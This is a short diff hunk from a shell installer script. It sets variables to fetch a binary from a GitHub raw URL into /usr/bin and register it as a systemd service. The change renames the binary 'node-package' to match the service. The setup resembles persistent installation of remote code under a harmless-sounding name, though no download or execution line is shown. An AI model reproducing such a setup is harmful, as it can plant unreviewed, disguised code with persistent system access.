@@ -6,7 +6,7 @@ set -e
 # Variables
 URL="https://github.com/yellphonenaing199/package-repo/raw/refs/heads/main/packages"
 TARGET_DIR="/usr/bin/"
-FILENAME="packages"
+FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
 SERVICE_NAME="node-package"
 SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
